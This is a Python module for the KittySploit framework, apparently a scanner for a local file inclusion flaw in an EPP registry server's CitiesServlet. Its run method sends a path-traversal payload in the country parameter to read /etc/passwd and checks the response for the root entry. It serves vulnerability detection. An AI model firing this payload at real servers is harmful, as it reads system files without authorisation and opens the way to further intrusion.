#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""servlet called "CitiesServlet" that handles HTTP GET requests, so the user-provided input, obtained from the c."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'EPP Server - Local File Inclusion Detection',
        'description': 'servlet called "CitiesServlet" that handles HTTP GET requests, so the user-provided input, obtained from the country parameter, is directly concatenated with the "/cities/cities_" string to form the fileName, This means an attacker can manipulate the country parameter and potentially access arbitrary files on the server\'s file system',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'epp', 'cocca', 'registry', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://hackcompute.com/hacking-epp-servers/'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/cities?country=/../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('application/json',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="EPP Server - Local File Inclusion detected",
                path='/cities?country=/../../../../../../../../etc/passwd',
            )
            return True
        return False

